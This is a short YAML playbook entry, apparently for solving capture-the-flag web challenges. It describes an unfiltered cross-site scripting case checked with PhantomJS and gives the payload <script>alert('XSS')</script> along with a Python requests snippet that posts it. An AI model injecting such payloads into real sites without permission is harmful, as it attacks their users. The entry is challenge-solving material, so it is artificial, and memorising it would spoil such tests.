name: xss_no_filter
category: web
tags: [xss, injection, no_filter, phantomjs]
indicators:
  - "User input directly concatenated to HTML"
  - "No sanitization or escaping"
  - "PhantomJS used to verify XSS execution"
  - "Need to trigger alert('XSS')"

tricks:
  - name: "Simple XSS - No filter"
    when: "User input directly inserted into HTML without filtering"
    how: "Use standard script tag with alert"
    payload: |
      <script>alert('XSS')</script>

      # Python exploit:
      import requests
      payload = "<script>alert('XSS')</script>"
      requests.post(url, data={"solution": payload})
